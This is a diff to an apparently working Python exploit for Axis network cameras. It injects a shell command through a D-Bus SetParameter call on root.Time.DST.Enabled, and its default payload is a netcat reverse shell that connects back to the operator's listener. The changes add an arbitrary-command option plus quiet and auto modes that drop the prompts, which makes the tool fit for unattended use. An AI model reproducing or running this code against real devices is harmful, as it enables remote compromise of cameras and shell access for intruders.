@@ -21,15 +21,23 @@ from time import sleep
 
 stage: int = 1
 
+def logging(message: str):
+    if not args.quiet:
+        print(message, end="")
+
 parser = argparse.ArgumentParser()
-parser.add_argument("-t", "--target", type=str, required=True, help="Target device IP")
-parser.add_argument("-tp", "--target-port", type=int, help="Target device port (default: 80)")
-parser.add_argument("-f", "--file", type=str, help="Target file (optional)")
+parser.add_argument("-a", "--auto", action="store_true", help="Auto mode (do not prompt for listener)")
+parser.add_argument("-c", "--command", type=str, help="Command to run (default: 'nc [LISTEN] [LISTEN_PORT] -e /bin/sh')")
+parser.add_argument("-f", "--file", type=str, help="Target file path (default: index.shtml)")
 parser.add_argument("-l", "--listen", type=str, help="Listener IP (default: response from http://checkip.amazonaws.com)")
 parser.add_argument("-lp", "--listen-port", type=int, help="Listener port (default: 1337)")
 parser.add_argument("-o", "--overlay", type=str, help="Image overlay text (optional)")
 parser.add_argument("-p", "--proxy", type=str, help="Proxy to send requests in URL form 'http://IPADDRESS:PORT' (optional)")
+parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode (no prompt, no output)")
 parser.add_argument("-s", "--https", action="store_true", help="HTTPS")
+parser.add_argument("-t", "--target", type=str, required=True, help="Target device IP")
+parser.add_argument("-tp", "--target-port", type=int, help="Target device port (default: 80)")
+parser.add_argument("-x", "--test", action="store_true", help="Test for vulnerability only")
 
 args = parser.parse_args()
 
@@ -57,7 +65,7 @@ else:
     try:
         listen_ip = requests.get("http://checkip.amazonaws.com", proxies=req_proxy).text.strip()
     except:
-        print("Could not determine listener local IP address, quitting.")
+        logging("Could not determine listener local IP address, quitting.")
         exit(1)
 
 if (args.listen_port != None):
@@ -72,11 +80,14 @@ if (args.https):
 if (args.overlay):
     overlay_text = args.overlay
 
-cmd = f"nc {listen_ip} {listen_port} -e /bin/sh"
+if (args.command):
+    cmd = f"{args.command}"
+else:
+    cmd = f"nc {listen_ip} {listen_port} -e /bin/sh"
 
-print(f"Configuration\n-------------\nTarget: {target_proto}://{target_ip}:{target_port}/{target_file}\nListener: {listen_ip}:{listen_port}\nOverlay: {overlay_text}\nProxy: {req_proxy}\nCommand: {cmd}\n")
-
-# Pseudorandom character generation
+logging(f"Configuration\n-------------\nTarget: {target_proto}://{target_ip}:{target_port}/{target_file}\nListener: {listen_ip}:{listen_port}\nOverlay: {overlay_text}\nProxy: {req_proxy}\nCommand: {cmd}\n")
+logging(f"\n")
+# Character generation
 def gen_chars(count: int) -> str:
     letters = ''.join(random.choice(string.ascii_lowercase) for i in range(count))
     return letters
@@ -89,33 +100,33 @@ def http_check(req: requests, test: bool = False) -> int:
                 return 0
 
         case 204:
-            print(f"Empty response received. Success?\n")
+            logging(f"Empty response received. Success?\n")
             return 0
         
         case 303:
             if (test):
                 if (req.text.find('Continue to') >= 0):
-                    print(f"Test connection SUCCESS\n")
+                    logging(f"Test connection SUCCESS\n")
                     return 0
-                print("Test connection FAIL")
+                logging("Test connection FAIL")
             
-            print("Something went wrong")
-            print(req.status_code)
-            print(req.text)
+            logging("Something went wrong")
+            logging(req.status_code)
+            logging(req.text)
         
         case 403:
-            print(f"Unable to connect.\nAUTH ERROR\n")
-            print(f"URL requested: {req.request}")
+            logging(f"Unable to connect.\nAUTH ERROR\n")
+            logging(f"URL requested: {req.request}")
         
         case 404:
-            print(f"Specified target {req.request} not found.\n")
+            logging(f"Specified target {req.request} not found.\n")
         
         case _:
-            print(f"Unexpected response from server.")
-            print(f"Received status code: {req.status_code}")
-            print(f"Response:\n{req.text}")
+            logging(f"Unexpected response from server.")
+            logging(f"Received status code: {req.status_code}")
+            logging(f"Response:\n{req.text}")
         
-    print("Quitting")
+    logging("Quitting")
     return 1
 
 target_url = f"{target_proto}://{target_ip}:{target_port}/{target_file}/{gen_chars(1)}.srv"
@@ -128,13 +139,11 @@ def test_connect():
         'return_page': gen_chars(5),
     }
     
-    print(f"Stage {stage}: Testing connection to device... ")
+    logging(f"+ Testing connection to device...\t\t\t\t")
     
     if http_check(requests.post(f"{target_url}", data=TEST_DATA, proxies=req_proxy, allow_redirects=False), True):
-        print("Quitting")
+        logging("Quitting")
         exit(1)
-
-    stage += 1
 
 # Sync modifications
 def sync_req():
@@ -143,7 +152,7 @@ def sync_req():
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SynchParameters",
     }
     
-    print(f"Syncing parameters... ")
+    logging(f"Syncing parameters...\t\t\t\t\t")
     
     if http_check(requests.post(f"{target_url}", data=SYNC_DATA, proxies=req_proxy, allow_redirects=False)):
         exit(1)
@@ -158,7 +167,7 @@ def overlay_req():
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.String string:{overlay_text}",
     }
 
-    print(f"Stage {stage}: Attempt to modify image overlay text... ")
+    logging(f"Stage {stage}: Attempt to modify image overlay text...\t\t")
 
     if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
         exit(1)
@@ -173,7 +182,7 @@ def command_reset_req():
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:True",
     }
     
-    print(f"Stage {stage}: Resetting root.Time.DST.Enabled")
+    logging(f"Stage {stage}: Resetting root.Time.DST.Enabled\t\t")
     if http_check(requests.post(f"{target_url}", data=RESET_DATA, proxies=req_proxy, allow_redirects=False)):
         exit(1)
     
@@ -189,7 +198,7 @@ def command_req():
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;({cmd_ifs})&",
     }
     
-    print(f"Stage {stage}: Attempt to exploit dbus and inject command to root.Time.DST.Enabled... ")
+    logging(f"Stage {stage}: Injecting command to root.Time.DST.Enabled...\t")
     if http_check(requests.post(f"{target_url}", data=COMMAND_DATA, proxies=req_proxy, allow_redirects=False)):
         exit(1)
     
@@ -199,9 +208,15 @@ def command_req():
 def main():
 
     test_connect()
+
+    if (args.test):
+        exit(0)
+  
+    logging("+ Preparing to execute exploit.\n")
     
-    print("Preparing to execute exploit.")
-    input("Start listener and press Enter to continue...")
+    if not args.quiet:
+        if not args.auto:
+            input("= Start listener and press Enter to continue...")
     
     if (overlay_text != ""):
         overlay_req()
@@ -211,6 +226,7 @@ def main():
     sync_req()
     
     command_req()
+    logging("+ Running sync to execute command\n")
     sync_req()
     
     command_reset_req()
